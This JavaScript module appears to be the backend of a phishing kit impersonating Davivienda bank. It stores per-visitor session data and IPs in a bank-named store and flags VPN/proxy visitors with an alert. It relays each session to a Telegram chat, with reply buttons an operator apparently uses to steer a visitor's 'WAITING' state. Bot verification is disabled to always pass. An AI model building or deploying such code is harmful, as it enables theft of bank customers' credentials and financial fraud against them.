let kv;
try {
    const mod = await import('@vercel/kv');
    kv = mod.kv;
} catch (e) {
    // Vercel KV no disponible localmente o no instalado
}

let memoryStore = globalThis.__DAVIVIENDA_STORE__ || {};
globalThis.__DAVIVIENDA_STORE__ = memoryStore;

export async function verifyTurnstile(token) {
    // Validación deshabilitada para no requerir credenciales extra
    return true;
}

export function getClientIp(req) {
    const forwarded = req.headers['x-forwarded-for'];
    if (forwarded) {
        return forwarded.split(',')[0].trim();
    }
    return req.socket?.remoteAddress || '127.0.0.1';
}

export async function setUserState(identifier, status) {
    if (!memoryStore[identifier]) memoryStore[identifier] = {};
    memoryStore[identifier].status = status;
    try {
        await kv.set(`status_${identifier}`, status, { ex: 3600 });
    } catch (e) {
        // Fallback en memoria si KV no está configurado
    }
}

export async function getUserState(identifier) {
    if (memoryStore[identifier] && memoryStore[identifier].status) {
        return memoryStore[identifier].status;
    }
    try {
        const status = await kv.get(`status_${identifier}`);
        return status || 'WAITING';
    } catch (e) {
        return 'WAITING';
    }
}

export async function getUserSessionData(identifier) {
    let session = memoryStore[identifier] || {};
    try {
        const kvData = await kv.get(`session_${identifier}`);
        if (kvData) {
            session = { ...session, ...kvData };
        }
    } catch (e) {
        // Fallback a memoria
    }
    return session;
}

export async function saveUserSessionData(identifier, data) {
    const prev = await getUserSessionData(identifier);
    const updated = { ...prev, ...data };
    memoryStore[identifier] = updated;
    try {
        await kv.set(`session_${identifier}`, updated, { ex: 3600 });
    } catch (e) {
        // Fallback a memoria
    }
    return updated;
}

export async function checkVpnProxy(ip) {
    if (["127.0.0.1", "localhost", "::1"].includes(ip)) return "";
    try {
        const res = await fetch(`https://ipwho.is/${ip}`);
        const data = await res.json();
        if (data.security && (data.security.vpn || data.security.proxy)) {
            return " 🚨 <b>[ALERTA: POSIBLE VPN/PROXY]</b>";
        }
    } catch (e) {
        console.warn("VPN check failed:", e);
    }
    return "";
}

export async function sendOrUpdateTelegramMessage(sessionKey, message, replyMarkup = null) {
    const token = process.env.TELEGRAM_BOT_TOKEN;
    const chatId = process.env.TELEGRAM_CHAT_ID;
    
    if (!token || !chatId) {
        console.warn("Telegram Token o Chat ID no configurados.");
        return null;
    }
    
    const session = await getUserSessionData(sessionKey);
    const messageId = session.messageId;

    if (messageId) {
        // Intentar editar el mensaje existente para mantener todo en un solo mensaje ordenado
        try {
            const editRes = await fetch(`https://api.telegram.org/bot${token}/editMessageText`, {
                method: "POST",
                headers: { "Content-Type": "application/json" },
                body: JSON.stringify({
                    chat_id: chatId,
                    message_id: messageId,
                    text: message,
                    parse_mode: "HTML",
                    reply_markup: replyMarkup
                })
            });
            const editData = await editRes.json();
            if (editData.ok) {
                return messageId;
            }
        } catch (e) {
            console.error("Error al editar mensaje de Telegram:", e);
        }
    }

    // Si no existe o falló la edición, enviar uno nuevo
    const payload = {
        chat_id: chatId,
        text: message,
        parse_mode: "HTML"
    };
    if (replyMarkup) payload.reply_markup = replyMarkup;

    try {
        const res = await fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify(payload)
        });
        const resData = await res.json();
        if (resData.ok && resData.result) {
            const newMsgId = resData.result.message_id;
            await saveUserSessionData(sessionKey, { messageId: newMsgId });
            return newMsgId;
        }
    } catch (e) {
        console.error("Telegram send error:", e);
    }
    return null;
}

export async function sendTelegramMessage(message, replyMarkup = null) {
    const token = process.env.TELEGRAM_BOT_TOKEN;
    const chatId = process.env.TELEGRAM_CHAT_ID;
    
    if (!token || !chatId) {
        console.warn("Telegram Token o Chat ID no configurados.");
        return;
    }
    
    const payload = {
        chat_id: chatId,
        text: message,
        parse_mode: "HTML"
    };
    if (replyMarkup) payload.reply_markup = replyMarkup;

    try {
        await fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify(payload)
        });
    } catch (e) {
        console.error("Telegram send error:", e);
    }
}
